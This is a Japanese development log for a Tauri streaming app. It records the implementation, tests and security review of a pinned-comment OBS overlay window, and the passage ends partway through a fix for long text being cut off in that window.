一方で 046a の `CommentViewerApp.tsx` 行番号が**一律 7 行ずれ**ていた（保存 effect ブロック 7 行を足す前の値のまま。
「実装完了後の値に更新済み」という記述自体が事実と違っていた）ため現物に合わせて再修正。親 046 の古い行番号・
「`CommentViewDto` を**そのまま**載せる」（avatar を落とすので不正確）・状態行（046a 実装済みを反映）も併せて訂正した。

**検証**: `typecheck` / `lint` pass、`test` pass（**16 files / 189 tests**・178 から +11）。`act()` 警告なし。
`git status --short -- apps/desktop/src-tauri/ apps/comment-sidecar/ apps/desktop/package.json` は**差分ゼロのまま**
（レビュー対応も frontend と docs に閉じている）。

### 実機確認後の修正（2026-07-28・依頼者の `tauri dev` での確認を受けて）

**1. 固定帯とコメント一覧の間に divider を追加**

境目が分からないという指摘。`.pinnedBar` に `border-bottom: 1px solid var(--border-soft)` を足した
（**色は `.toolbar` の `border-bottom` と同じ役割トークン**＝画面内の区切り線が揃う。生 hex/rgba は引き続きゼロ）。

- 線をツールバーと**同じ幅（窓幅いっぱい）**にするため、左右のインセットを `margin: 8px 16px 0` →
  `margin: 8px 0 0` ＋ `padding: 0 16px 8px` へ組み替えた。margin のままだと線が左右 16px ずつ内側で切れて
  ツールバーと見え方が変わるため。項目そのものの見え方は変わらない。
- `border-bottom` は**スクロールコンテナの border box** に付くので、`max-height: 22vh` を超えて帯の中を
  スクロールしても線は下端に留まる（一緒に流れない）。
- 固定 0 件のときは `PinnedCommentBar` が `null` を返すので**線も自動的に消える**（既存レイアウト不変は維持）。

**2. 「固定解除」ボタンを廃止し、解除を右クリックメニューへ一本化**

ボタンが不要という指摘。**固定帯の項目を右クリック → 「固定解除」**に変更した。

- 一覧側の行を右クリックする導線は元々動く（`onPin` がトグルで、`pinnedIds` により文言が「固定解除」になる）が、
  **一覧は `MAX_COMMENTS`(=200) でクランプされる**ため、固定したコメントが流れ去ると右クリックする対象そのものが
  消えて**解除できなくなる**。ボタンを外すだけだとこの詰みが発生するので、**帯の側にも同じメニューを出す**ことにした。
- メニュー UI は `CommentList` と同じ [`CommentContextMenu`](../apps/desktop/src/screens/comment-viewer/CommentContextMenu.tsx) を
  再利用（**新規依存ゼロ**）。`PinnedCommentBar` が開閉 state（`{x, y, id} | null`）を持つ点も `CommentList` と同じ作法。
- `preventDefault` は**帯の項目だけ**＝アプリ全体のネイティブメニューは従来どおり出る（一覧行と同じ扱い・テストで固定）。
- メニューは `position: fixed` なので、`overflow-y: auto` の `.pinnedBar` の**外**（フラグメント直下）に描く
  ＝帯の中をスクロールしても取り残されず、クリップの懸念も持ち込まない。
- **a11y**: 解除ボタンを失うとキーボードからの解除導線が無くなるため、帯の項目に `tabIndex={0}` を付けて
  **Shift+F10 / メニューキーで開ける**ようにし、`.pinnedItem:focus-visible` でフォーカス位置を可視化した
  （キーボード由来の `contextmenu` は `clientX/Y` が 0 で来るので、既存の「項目の左下へ出す」フォールバックに乗る）。
- CSS は 2 カラム構成（`display:flex` ＋ `.pinnedBody`）を解消して単一カラムへ戻し、`.pinnedRemove` の 3 ブロックを削除。
  `CommentViewerApp.tsx` は**変更なし**（`handleUnpin` はそのまま `onUnpin` に渡り続ける）。

**検証**: `typecheck` / `lint` pass、`test` pass（**16 files / 192 tests**）。`PinnedCommentBar.test.tsx` の
「ボタン押下で `onUnpin`」を「右クリック→メニュー項目で `onUnpin`」へ差し替え、**解除ボタンが存在しないこと**・
`preventDefault` の抑止・Esc で閉じる（`onUnpin` を呼ばない）を追加で固定した。
Rust / sidecar / capabilities / `package.json` は引き続き**差分ゼロ**、`csp: null` 不変、新規宛先・依存ゼロ。

## 2026-07-29 (046b 固定コメント専用オーバーレイ窓: 新窓 `pinned-overlay`＋新 capability＋Rust 3 コマンド)

046a の固定コメントを、既存のコメント一覧オーバーレイ（`comment-overlay`）とは**独立した別ウィンドウ**
（label `pinned-overlay`）で OBS へ出せるようにした（親 [046](tasks/046-pinned-comment-overlay.md) の要望③後半）。
専用オーバーレイは **WS に接続せず**、046a がピンストア（localStorage）に書いた固定コメントを
read-on-mount ＋ `storage` 購読で描くだけ＝**表示専用・通信面ゼロ**。

**046a の `pinnedComments.ts` は読むだけで無改変**、**044a（OBS 自動ソース追加）の sidecar コードも無改変**。
`tauri.conf.json`（`csp: null`）/ `vite.config.ts` / `package.json` / `pnpm-lock.yaml` は**差分ゼロ**。

### 依頼者の決定（設計の確定事項）

計画段階で 4 点を確認し、以下に確定した（1 は当初のタスクファイル記載から変わっている）。

| 論点 | 決定 | 補足 |
|---|---|---|
| トグルの置き場所 | **設定ビューに専用カード**（既存 OBS カードの直後） | 046b タスクファイルの初期案どおりだが、根拠は 045b 後の線引きで再確認した（下記） |
| ON の意味 | **ON で即座に窓を開く** | ピン 0 件なら完全透明。OBS でソースを**先に**追加できる |
| 永続化 | **覚えておく**（localStorage）。ON ならコメビュ本体のマウント時に窓を開き直す | 配信開始時に OBS ソースが黒いままにならない |
| 描画方式 | `CommentList variant="overlay"` を流用（0 件は呼ばず `null`） | 本体の一覧と同じ描画を通る＝見え方が食い違わない |
| 意匠 | 既存オーバーレイ設定（フォント / サイト名表示）に**追従** | 同じ OBS 画面に 2 窓出るため。設定項目は増やさない |
| ジオメトリ | `position(456,48)` / `inner_size(480,320)` / `min(280,160)` | 下記 |

### トグルを設定ビューに置いた理由（045b の線引きとの整合）

045b は「**配信中に頻繁に切り替える＝本体ツールバー／一度きりのセットアップ＝設定カード**」で表示トグルを
ツールバーへ移設した（034d の部分反転）。046b はこの基準に照らすと**後者**にあたる:

- 固定コメントの出し入れは**固定/固定解除（右クリックメニュー）側の仕事**で、窓そのものは開けっぱなしにする。
  親 046 が「ピン 0 件で窓が自動的に閉じると OBS のウィンドウキャプチャソースが壊れる」として自動 close を
  禁じている以上、**窓の開閉は配信中の操作ではない**。
- この窓は 044a の自動追加の**対象外**＝OBS で手動ウィンドウキャプチャを追加する作業が必要で、その手順注記と
  同じカードにトグルがあるのが導線として自然。
  → ⚠ **この理由は 046d で失効**（自動追加の対象に入れた）。トグルの置き場所は上記の別 2 点（一度きりの
  セットアップ・固定/解除は右クリック側の仕事）で引き続き妥当なため、設定ビューのまま据え置いた。

**なお計画時に依頼者へ伝えた事実訂正**: `.toolbarActions` は 045c で `flex-wrap: wrap` が入っており（同節参照）、
3 つ目のトグルを足しても「溢れる」ことはない。ただし折り返すとツールバーが 2 段になり配信中に一覧位置がずれるため、
混雑は補助的な理由に留めて上記の性質差を主理由にした。

**既存 OBS カードには一切手を入れていない**（見出し・自動反映トグル・状態表示・パスワード欄・窓名注記すべて不変。
`SettingsView.obs.test.tsx` の既存アサートも無改変で通る）。カードを分けたのは、既存カードが
「見出しがカード内に無いコントロール名を指している」という指摘（045b レビュー）を既に抱えており、
別機能のトグルを相乗りさせると悪化するため。

### 親 046 の「自動開閉にしない」からの**意図的な逸脱**（重要）

親 046 は「専用オーバーレイの開閉は明示トグル（**自動開閉にしない**）」と書いているが、**自動 open だけを解禁した**。

- 046 が挙げている理由は「**ピン 0 件で窓が自動で閉じると** OBS ソースが黒くなる」＝**自動 close の禁止**。
- 今回入れたのは、**ユーザーが明示的に ON にした永続設定**に基づく、コメビュ本体マウント時の自動 open。
  窓がより確実に存在する方向＝親 046 の懸念とは向きが逆で、意図には沿う。
- **自動 close は作っていない**。設定 OFF なのに窓が開いていた場合も**何もしない**（テストで固定）。
- security-review の指摘（軽微）: 045c は「ユーザー操作なしに窓が開く経路が 1 本減る」ことをセキュリティ上の
  前進として記録しており、方向としては逆行する。許容根拠は ①起点が明示的な永続設定（既定 OFF）
  ②開く窓は表示専用で**新規通信・OBS 接続・sidecar 起動をいずれも伴わない**（045c が問題視したのは
  「設定 ON が OBS への**接続契機**になっていた」点で、そこは無関係）。

### Rust: 単一目的 3 コマンド（既存 overlay と同型）

`open_pinned_overlay_window` / `close_pinned_overlay_window` / `is_pinned_overlay_open` を追加し、
`invoke_handler` へ登録した。**引数は `AppHandle` のみ＝frontend から値を受け取らない**（ラベルは Rust 内のリテラル）。

- `WINDOW_OPEN_LOCK` を再利用（viewer/comment-overlay と共有の二重生成ガード）。
- **`SHARED_BROWSER_ARGS` を必ず渡す**。全 4 窓（`main` は `tauri.conf.json`・`comment-viewer`・`comment-overlay`・
  `pinned-overlay`）で一致していないと Windows の WebView2 生成が `ERROR_INVALID_STATE` で失敗し**窓が開かない**
  （033f 追修正③の回帰）。実測で 4 箇所一致を確認済み。
- 透過 / `decorations(false)` / `always_on_bottom(true)` / `focused(false)` / `shadow(false)` /
  `background_throttling(Disabled)` を踏襲。
- **window イベント（sidecar 連動）を登録しない**（`comment-overlay` の 217-218 行に倣う）＝**この窓を閉じても
  sidecar は落ちない**（no-orphan 3 段 kill の契機はコメビュ窓に集約のまま・§6 の PID kill は発生しない）。

### 窓タイトルとジオメトリ

| 項目 | 既存 `comment-overlay` | 新規 `pinned-overlay` | 理由 |
|---|---|---|---|
| title | `StreamDock コメントオーバーレイ` | **`StreamDock 固定コメント`** | 044a は `itemName.includes("StreamDock コメントオーバーレイ")` で窓を探す（`obs-client.ts`）。**部分一致で紛れない名前**が必須条件。テストで「含まない」ことを固定した |
| position | `(24, 48)` | **`(456, 48)`** | 既存 overlay は x=24〜424 を占める。右隣に置いて**重ねない**＝デスクトップでも OBS の窓一覧でも取り違えない |
| inner_size | `(400, 720)` | **`(480, 320)`** → ⚠ **046c で `(480, 560)` へ修正** | 幅は「2026-07-28 (OBS オーバーレイの横幅)」節の教訓（640 は広すぎ→400 へ差し戻し・「次に試すなら 480〜520」）の**下限**を採る。1 件だけなので画面を圧迫しない。~~高さは投げ銭カード＋長文（290 字）が収まる余裕~~ ← **この高さの見積りが誤り**（290 字には ≈554px 必要で、320 では約 57% しか出ない）。E2E で長文が見切れ、下記 046c 節で 560 へ引き上げた |
| min_inner_size | `(240, 320)` | **`(280, 160)`** | `.decorations(false)` で手動リサイズが実質できず**サイズは永続化されない＝既定値がすべて**（同節の教訓） |

### 描画: `CommentList variant="overlay"` の流用（0 件は呼ばない）

**固定 0 件のときは `PinnedOverlayApp` が `null` を返す**ことで、`CommentList` の空表示
「コメントはまだありません」が OBS に映り続ける問題を回避した（`CommentList` 側に空表示分岐を足さずに済む＝
既存 `comment-overlay` の見え方は完全に不変）。

- 既存 `comment-overlay` が 0 件時に空文言を許容している理由は「接続前に OBS でキャプチャ範囲を確認できる」
  ＝**セットアップ時の一度きり**の利点。固定オーバーレイは親 046 が自動 close を禁じているため
  **0 件が通常状態**で、性質が違う（本体の `PinnedCommentBar` が 0 件で `null` を返すのと同じ扱いに揃えた）。
- 付属物はいずれも無害: `followMode` は既定 `"off"` ＝ `useFollowScroll` は no-op（固定は流れていかない）。
  `<ol>` は `html[data-overlay="1"] ol::-webkit-scrollbar` の**既存**ルールでスクロールバーが消える。
- 型: `CommentAuthor.avatar` が optional なので `PinnedComment[]` → `CommentViewDto[]` は構造的に代入可
  （`pinnedComments.ts` の型注記どおり）。投げ銭カードのティア配色・要約文言も本体と同じ描画を通る。
- **新規 CSS ファイルはゼロ**。`OverlayApp.module.css` の `.root` と透過ガード、`OverlayComment.module.css` を
  **参照するだけ**（`CommentList.tsx` が 2 つの module CSS を import している前例に倣う）。既存 CSS は 1 行も変更していない。
- アイコンは**イニシャル丸**（046a が avatar を保存しないため・この窓は WS へ繋がず再取得もしない）。
  `parsePinned` が `author: { id, name }` を明示構築するので、**localStorage を手で書き換えても avatar を注入できない**
  ＝036a の「webview が踏むのは data URI のみ」ガードは無傷。

### `storage` 到達性（⚠ 実機で判定する唯一の未検証点）

034e(review M1) と同じ未検証点を踏む＝**別 webview（comment-viewer → pinned-overlay）間で `storage` イベントが
跨って届くかはプラットフォーム依存で未検証**。設計は二段構え（保証ベースライン＝read-on-mount／即時反映＝
`storage` 購読）だが、**046b では即時反映が完了条件**（配信中に固定するたび窓を開き直す運用は OBS ソースが
一瞬切れるため実用に耐えない）という点が 034e と決定的に違う。

**実機判定が未了のため、代替案は実装していない**。届かないと判明した場合の候補（親 046 の制約＝新規 WS /
Rust emit / 外部通信 / 依存を増やさない、の内側）:

| 案 | コスト | 判定 |
|---|---|---|
| **localStorage ポーリング**（`setInterval` で生文字列を前回値と比較し、変化時だけ再読込） | 1〜2 秒間隔の同期 read（キー 1 個・avatar 抜きで数 KB＝μs 級）。最大 1 間隔ぶん遅延。常時タイマー | **採るならこれ**。制約に一切触れず、`storage` 購読と共存できる（届く環境では空振り） |
| `BroadcastChannel` | 「別 webview 間で届くか」が `storage` と**同じ未検証点**に依存＝当てが無い。親 046 の「localStorage で完結」からも外れる | 却下 |
| Tauri の `emit`/`listen` | 親 046 が「新規 emit を増やさない」と明記。capability 検討＝**線引き改訂＋security-review のやり直し** | 却下 |

**実装側の備え**: 再読込を `reloadPinned()` の 1 関数に閉じてあるので、採用時は別契機から呼ぶだけで足りる
（コード内に再修正トリガーとしてコメント済み）。

### 永続化キー（新規 1 個）

`overlaySettings.ts` に `PINNED_OVERLAY_ENABLED_KEY = "stream-dock.comment-viewer.pinned-overlay-enabled"` と
`loadPinnedOverlayEnabled()` / `savePinnedOverlayEnabled()` を追加（`obsAutoAdd` と同型）。
**`pinnedComments.ts` は触っていない。**

この値は**ユーザー自身の UI 設定値（boolean）**で、§9 追補（046a）が対象とする第三者の個人データ
（本文・表示名・金額）ではない＝**「レビュー必須条件」の localStorage 追補には該当しない**
（`docs/security.md` の Capabilities 方針 046b 節に整理を明記）。

### テスト（17 files / **220 tests**・192 から +28）

- **新規** `PinnedOverlayApp.test.tsx`（11 ケース）: **WS へ接続しない**（`connectCommentStream` の呼び出し 0 回）／
  read-on-mount で描く／`storage` で即反映／**固定解除は `"[]"` の書込として届き表示が消える**／
  無関係なキーの書換では読み直さない／`clear()`（key=null）では読み直す／0 件なら何も描かない（空文言も出ない）／
  サイト名表示の追従／`monthCount`・`tier` を保存している効果（要約文言が本体と同一）／
  `data-overlay` を立てて unmount で外す／0 件でも `data-overlay` は立てる（窓は透明のまま）。
- `CommentViewerApp.toolbar.test.tsx` に 7 ケース追記（046b describe）: 設定ビューに描画し**本体ツールバーには出さない**／
  ON で `openPinnedOverlayWindow`＋永続化／OFF で `closePinnedOverlayWindow`＋永続値 false／
  **永続 ON で窓が無ければマウント時に自動オープン**／窓が既に開いていれば開き直さない／
  **永続 OFF なら自動で開かず、開いていた窓を自動で閉じもしない**（親 046 の自動 close 禁止）／
  044a とは独立（`enableObs`/`hideObs`/`disableObs`・コメント用オーバーレイの開閉を呼ばない）。
- `SettingsView.obs.test.tsx` に 5 ケース追記: トグルが props を呼ぶ／ON 表示／**窓名が Rust と同一文字列で
  コメント用オーバーレイ名と部分一致しない**／044a の対象外である旨を明示／**既存 OBS カードが不変**。
- `overlaySettings.obs.test.ts` に 5 ケース追記: 既定 OFF／往復／`"true"` 厳密一致／例外時フォールバック／
  **044a のキーと独立**（互いに書き換えない）。
- **ミューテーション実測**（4 件・すべて対応するケースだけがレッドになることを確認）:
  ①0 件の early return 削除 → 「0 件なら何も描かない」がレッド
  ②`storage` のキー絞り込み削除 → 「無関係なキーでは読み直さない」がレッド
  ③マウント effect の `!open` 削除 → 「既に開いていれば開き直さない」がレッド
  ④永続化 effect 削除 → ON/OFF の永続ケース 2 件がレッド。

### ⚠ 落とし穴（次回も踏む）

`CommentViewerApp.toolbar.test.tsx` の `vi.mock("...windowApi")` は**モジュールを丸ごと差し替える**ため、
`windowApi.ts` に export を足したら**必ずここにも足す**。書き漏らすと `isPinnedOverlayOpen` が undefined になり、
マウント effect が「undefined is not a function」で落ちて**実装が正しくても全 12 ケースがレッド**になる
（今回まさにこれを踏んだ。同ファイル冒頭の「export 面を全て埋める」方針の実例）。

### 検証結果

`typecheck` / `lint` pass、`test` pass（**17 files / 220 tests**）、`cargo check` pass。
`cargo fmt` は本 diff 部分について clean（lib.rs に残る 2 件は 046b 以前からの既存差分）。

security-review 用の機械的担保（すべて実測）:
- `git status --short -- apps/desktop/src-tauri/capabilities/` → **`pinned-overlay.json` の追加のみ**（既存 3 枚は差分ゼロ）
- `git diff -- apps/desktop/src-tauri/tauri.conf.json apps/desktop/vite.config.ts apps/desktop/package.json pnpm-lock.yaml` → **出力ゼロ**
- `git diff -- apps/comment-sidecar/` → **出力ゼロ**（044a 不変）
- `git diff --stat -- .../pinnedComments.ts .../OverlayApp.tsx .../CommentList.tsx .../*.module.css` → **出力ゼロ**
- `PinnedOverlayApp.tsx` の `fetch` / `WebSocket` / `invoke(` / `connectCommentStream` / 外部 URL / `console.*` → **ゼロ**
  （唯一の `connectCommentStream` の文字列は「呼ばない」と書いた JSDoc）
- Rust / frontend に `println!` / `eprintln!` / `console.*` / `app_logs` の追加 → **ゼロ**

実機確認（`tauri dev`）は本人環境。目視項目: トグルで開閉／再起動後も ON なら自動で開く／既存 `comment-overlay` と
別窓・別ソースとして OBS に取り込める／**046a で固定→即反映・解除で消える（⚠ の判定）**／開き直しで必ず最新／
0 件で余計な文字が映らない／**専用オーバーレイを閉じても sidecar が落ちない**／既存 overlay と 044a が従来どおり。

### security-review（2026-07-29・実装直後）

**判定: 軽微な懸念あり（修正必須 0 件）**。

- **懸念①（許容）**: 永続 ON のときマウントで窓が自動オープンする＝「このセッション中にユーザー操作なしで窓が開く」
  経路が 1 本増える（045c が削除した経路と逆行）。根拠は上の「意図的な逸脱」節のとおり。
- **懸念②（docs で対応）**: 親 046 の「自動開閉にしない」という**文言**とは食い違うため、本節と 046b タスクファイルに
  逸脱として明記した。
- **懸念③（整理を明文化）**: 新 localStorage キーは UI 設定値であり §9 追補（046a）の対象外。`security.md` に明記した。
- **後回しでよい改善**: コメビュ窓を閉じても固定オーバーレイは残る（既存 `comment-overlay` と同じ挙動）ため、
  第三者のコメントがコメント取得停止後も画面に残り続ける。046a で申し送り済みの「端末内保存データの一括削除・
  エクスポート」を作る際は、SQLite・ピンストアに加えて**この窓の表示状態**も対象に含めること（`security.md` §9 追補に追記済み）。
- **良かった点**: 3 コマンドとも引数ゼロ＝ユーザー入力が OS 操作に渡る経路が存在しない／新 capability が
  ラベル完全一致で `default.json` の広い permission を遮断できている／窓名の部分一致回避をテストで固定／
  046a の明示列挙により localStorage 改ざんでも avatar（外部 URL）を注入できない。

### docs の更新

- `docs/security.md`: 「Tauri Permissions / Capabilities 方針」に **046b 節を新設**（新窓・新 capability・
  単一目的 3 コマンド・表示専用・no-orphan kill 不変・窓名の制約・新キーの位置づけ・review 判定）。
  §9 追補（046a）に**読み手が増えた旨**と一括削除時の申し送りを追記。
- `docs/tasks/046b-pinned-overlay-window.md` 冒頭に実装済み注記（トグル置き場所の根拠と、永続＋自動 open の決定）。
- `docs/task-board.md` の 046 系を更新。

## 2026-07-29 (046b 外部レビュー〔security + 品質〕の対応)

別チャットで security-review ＋ code-review を実施し、その指摘へ apply-review で対応した。
**総合判定は自己判定と同じ「軽微な懸念あり・修正必須 0 件」で追認**。通信・権限・プロセス・ファイル・ログ・
依存のいずれにも新しい穴は見つからず、機械的担保（capability 追加 1 枚のみ／`tauri.conf.json`・`vite.config.ts`・
`package.json`・`pnpm-lock.yaml`・sidecar・`pinnedComments.ts`・既存 overlay/CSS の差分ゼロ）はすべて再現された。

**レビューが自己判定に同意しなかった点は 1 つだけ**＝「指摘 1 点」という粒度。下記 S-1 が漏れていた。

### 要修正として直したもの（2 件）

- **S-1 / docs（自己レビューに無かった指摘）**: **前回配信で固定したコメントが、次の配信の開始時に
  ユーザー操作ゼロで本番画面に出る**。①ピン本体の永続（046a）②トグルの永続（046b）③ON ならマウント時に
  自動 open（046b）の 3 つが重なった帰結で、**永続した第三者の個人データが「配信に出る面」へ自動描画されるのは
  046b が初めて**（046a 単体の復元先はコメビュ窓の固定帯＝OBS キャプチャ対象外／既存 `comment-overlay` の
  中身は WS 由来で永続しない）。窓は最背面・透過・装飾なしで配信者自身は気付きにくい。
  **対応（依頼者が選択肢 B を決定・挙動変更）＝コメントビューアを開くたびにピンストアを空へ倒す**。
  `CommentViewerApp` の `pinned` state を `loadPinned()` 初期化から**空配列**へ変え、既存の保存 effect
  （`useEffect(() => savePinned(pinned), [pinned])`）がマウント時に `"[]"` を書くのをクリア手段として使う。
  **`pinnedComments.ts` は無改変**＝キー・保存項目・保存形・上限・046b の読み手契約はいずれも不変で、
  「いつ空へ倒すか」だけを本体側で決めた（ストアの役割は本体窓↔オーバーレイ窓の受け渡しであって
  セッションをまたぐ保存ではないので、046a の設計意図とも矛盾しない）。
  **この担保は未検証の `storage` 跨ぎ配送に依存しない**: アプリ再起動時はオーバーレイ窓がまだ存在せず、
  窓が開くのは必ずこの書込の後なので read-on-mount が空を読む（`storage` に依存するのは「オーバーレイを
  開いたままコメビュ窓だけ開き直した」二次ケースのみ）。
  副作用＝**ピンは配信をまたいで残らない**（毎回固定し直す運用）。設定カードの注記を
  「固定はコメントビューアを開くたびにリセットされます」に差し替えて明示した。
  **落とし穴**: 保存 effect のマウント時 1 発がクリアを担うため、**そこに初回スキップ/前回値比較のガードを
  足すと S-1 が再発する**（コード側にその旨をコメント済み）。
  再修正トリガー＝「配信をまたいで固定を残したい」要望が出たら、起動時クリアをやめるのではなく
  「前回の固定を復元しますか」を明示操作にする（**無操作で配信面に出さない**を守る）。
- **Q2 / 連打レース（コード修正）**: `open_pinned_overlay_window` は `#[tauri::command(async)]`（別スレッド・
  窓生成で数百 ms）、`close_pinned_overlay_window` は同期コマンドのため、ON→OFF 連打で
  「close が『窓なし＝no-op』で先に流れ、その後 open が窓を作る」順序が起こりうる。046b は自動 close 経路を
  持たないので、この状態は**セッション中ずっと**「設定 OFF なのに OBS へ固定コメントが映る」になる。
  `pinnedOverlayOpRef`（`useRef<Promise<void>>`）で開閉要求を**直列化**し、マウント同期 effect も同じキューに
  載せた（`.catch` はキューを詰まらせないための握りつぶし）。テストを 1 本追加（**220 → 221 tests**）。

### コメントで残したもの（修正不要と判断・意図/理由/再修正トリガーを併記）

| 指摘 | 置き場所 | 判断 |
|---|---|---|
| Q1 `.catch` を付けない根拠が `handleOverlayToggle` と「同じ」と書いてあるが実際は違う（あちらは `.then()` 内で state を立てる＝state が実窓の帰結／こちらは永続設定なので同期で先に立てる） | `CommentViewerApp.tsx` `handlePinnedOverlayToggle` | eager set 自体は正しいのでコメントの根拠だけ訂正 |
| Q4 窓名の非衝突と `SHARED_BROWSER_ARGS` 全 4 窓一致が **grep と実機依存**（Rust に単体テストが無い） | `lib.rs` `open_pinned_overlay_window` | 定数切り出しが既存 overlay/`tauri.conf.json` の差分ゼロ要件に触れるため**別タスク**。書き方（`include_str!`＋既存 `serde_json`・新規依存ゼロ）まで明記 |
| Q5 `OverlayApp` との重複（`data-overlay` effect・font/showSource の storage 購読 ≈30 行） | `PinnedOverlayApp.tsx` | 括り出すと既存 overlay に手が入るため据え置き。トリガー＝設定キー 3 つ目 or overlay 窓 3 つ目 |
| Q6 `OverlayApp.module.css` の `:global(html[data-overlay="1"] ol)` が**この窓にも効く**（同 CSS のコメントは単数前提） | `PinnedOverlayApp.tsx` | CSS は差分ゼロを守り、読み手側に注記。この窓の `<ol>` も 1 つだけなので前提は崩れていない |
| Q7 `is_pinned_overlay_open` を増やすコストの正当化 | `lib.rs` | 残す。read-only・引数ゼロ・既存 3 窓と API 形が揃う・テストで仕様固定できる。「余計な `show()` 回避」は副次的理由に格下げ |
| Q8 マウント effect が state でなく `loadPinnedOverlayEnabled()` を直読み | `CommentViewerApp.tsx` | **むしろ正しい**（解決待ちの間に OFF にされたら開かない。state 参照＋deps 空だと stale closure で開いてしまう）。意図を明記 |
| Q9 保存 effect がマウント時にも書き `storage` が 1 発飛ぶ | `CommentViewerApp.tsx` | 無害（読み手 2 窓ともこのキーを購読していない）。トリガー＝窓側がこのキーを購読したら前回値比較を足す |
| Q10 `CommentViewDto` に**任意**フィールドが増えると `toPinned` が黙って落とし「本体と見え方が食い違わない」前提が静かに崩れる | `PinnedOverlayApp.tsx` | `pinnedComments.ts` は差分ゼロを守り読み手側に注記（必須フィールド追加は型エラーになるので安全） |
| Q11 テストの `afterEach` が unmount cleanup を隠蔽しないか | `PinnedOverlayApp.test.tsx` | 隠蔽しない（`unmount()` を明示する専用ケースが担保）。その旨を注記 |
| Q12 見出しとトグル label が同一文字列（045b 既知問題の複製） | `SettingsView.tsx` | 上の OBS カードと作法を揃える方を優先し据え置き。トリガー＝045b 指摘の一般解としてまとめて直すとき |
| S-3/S-4 capability の最小権限が守る範囲 | `security.md` 046b 節 | ACL 面のみ＝**アプリ定義コマンドは ACL 対象外**で、この窓も全コマンドを呼べる（既存 3 窓と同構造・新規の穴ではない）。未使用の `core:menu`/`core:tray` も据え置き理由を明記 |

### レビューが**追認**した点（記録に値するもの）

- `core:default` の実体を `gen/schemas/acl-manifests.json` で展開して確認＝窓/webview 面は**すべて読み取り系**
  （`allow-create-*` / `allow-close` / `allow-set-*` を含まない）＝**この窓の JS から窓の生成・破棄・移動・
  リサイズはできない**。`windows` の glob 照合についても既存 3 枚はメタ文字を含まず `pinned-overlay` に一致しない。
- **4 つ目の窓を足しても no-orphan が壊れない**ことを確認（自己レビューに無かった非退行）。034f の
  `main` の `CloseRequested → app.exit(0)` が窓数に依らず全窓破棄＋`RunEvent::Exit` へ到達させるため、
  固定オーバーレイが残っていても sidecar は孤児化しない。
- **申し送り 3（新キーを §9 追補の対象外とした判断）は誤りの再発ではない**。`security.md` の
  「レビュー必須条件」に 046a のレビュー時点で「ユーザー自身の UI 設定値（テーマ・フォント・トグル・
  チャンネル名等）を localStorage に置く変更は本項に該当しない」と明文化済みで、**成文ポリシーの正しい適用**。
- **申し送り 2（自動 open）は 045c と矛盾しない**。045c が消したのは「別機能のトグルの**隠れた副作用**で窓が開き、
  かつ OBS への接続契機になる」経路。046b は「その窓を出すための専用トグル（既定 OFF）を明示 ON にした人への
  設定復元」で性質が違い、開く窓は通信・OBS 接続・sidecar 起動をいずれも伴わない。
- **行番号の照合はズレなし**（046a の一律 7 行ずれは再発せず）。ただし `lib.rs` の既存コメントにある
  「`open_comment_viewer_window` の 64-71」は実際には 136-142 を指す**既存の陳腐化**（046b の追加分は
  行番号を書かず関数名参照にしてあり、そちらが正しい作法）。

### 検証結果

`typecheck` / `lint` pass、`test` pass（**17 files / 222 tests**・220 から +2）、`cargo check` pass。
**ミューテーション実測 3 件**で、いずれも**対応するケースだけが**レッドになることを確認:

| ミューテーション | レッドになったケース |
|---|---|
| ①`handlePinnedOverlayToggle` の直列化を素の `void invoke()` へ戻す | 「ON→OFF を連打しても、OFF が窓生成の完了後に届く」のみ |
| ②設定カードの窓名注記に「StreamDock コメントオーバーレイ」を混ぜる | 「窓名は Rust と同一文字列で、コメント用オーバーレイ名と部分一致しない」のみ |
| ③`pinned` state の初期化を `loadPinned()` に戻す（S-1 が再発する状態） | 「前回セッションの固定は引き継がず、マウント時にピンストアを空へ倒す」のみ |

**差分ゼロ要件は維持**（`capabilities/` は `pinned-overlay.json` の追加のみ／`tauri.conf.json`・`vite.config.ts`・
`package.json`・`pnpm-lock.yaml`・`Cargo.toml`・`Cargo.lock`・sidecar・**`pinnedComments.ts`**・`OverlayApp.tsx`・
`CommentList.tsx`・`*.module.css` はいずれも差分ゼロ）。Q6 / Q10 の注記を CSS や `pinnedComments.ts` ではなく
`PinnedOverlayApp.tsx` に置いたのも、S-1 の対応を本体側の state に閉じたのも、この要件を壊さないため。

## 2026-07-29 (046c 固定オーバーレイの長文見切れ修正: 窓 560 化 ＋ 自動縮小フィット)

046b の E2E で「長文コメントを固定すると OBS 上で本文が見切れる」不具合が出たので修正した
（設計・却下案の詳細は [`docs/tasks/046c-pinned-overlay-long-text-fit.md`](tasks/046c-pinned-overlay-long-text-fit.md) を正とする）。

### 原因（CSS のクリップではなかった）

`-webkit-line-clamp` / `max-height` はリポジトリ全体で **0 ヒット**で、本文は DOM に全部出ている
（`CommentList.test.tsx:303-306` が 290 字で検証済み）。**窓の高さが足りず、溢れた分が黙って切れていた**。

1. `pinned-overlay` が `inner_size(480, 320)`＝既存 `comment-overlay` の 720 の半分以下だった。
2. `.root`（`height:100%`）と `ol.list`（`flex:1 + overflow-y:auto`）がどちらも窓高に固定される。
3. `li.item { flex-shrink:0 }`（043c）なので `li` は縮まず、素直に `ol` を溢れる。
4. `followMode` 既定 `"off"` ＝ `useFollowScroll` がスクロール位置に触れない → `scrollTop=0` のまま → **下側が切れる**。
5. スクロールバーは overlay スコープで完全非表示なので、**溢れていること自体が視覚的に分からない**。

**実測見積り**（480px 幅）: 横クローム 133px（`ol` padding 24 ＋ `li` padding 8 ＋ アイコン 44 ＋ gap 28 ＋
吹き出し padding 24 ＋ border 5）→ 本文幅 ≈347px → 19px で ≈18 字/行 → 290 字 ≈17 行 ≈484px ＋ 縦クローム ≈70px
＝ **≈554px 必要 vs 320px** ＝ 約 57%。報告の「『大好』（先頭から約 166 字目 ≒ 57%）で切れる」と一致した。

⚠ **上の 046b 節が高さ 320 の根拠を「投げ銭カード＋長文（290 字）が収まる余裕」と書いていたが、
この見積り自体が誤っていた**のが直接原因。当該行は取り消し線付きで訂正済み。

### 対応（依頼者の決定）

**「窓 560 化」が主役、「自動縮小フィット」は保険**という役割分担にした。

- **`lib.rs` の `inner_size(480, 320)` → `(480, 560)`**（290 字が等倍で収まる高さ）。JSDoc に実測見積りと
  「**ここを下げるとフィットが常時発動して文字が小さくなる**」警告を残した。`min_inner_size` は不変。
- **収まらない分は縮小して必ず全文を出す。UX 上の下限は設けない**（＝「…」省略や行数制限は採らない）。

### スケーリング手法: `transform: scale(k)` ＋ `width`/`height: ${100/k}%`

- **サイズ補正が本体**。transform はレイアウトに影響しないので、補正が無いと `ol` の `clientHeight`/`scrollHeight`
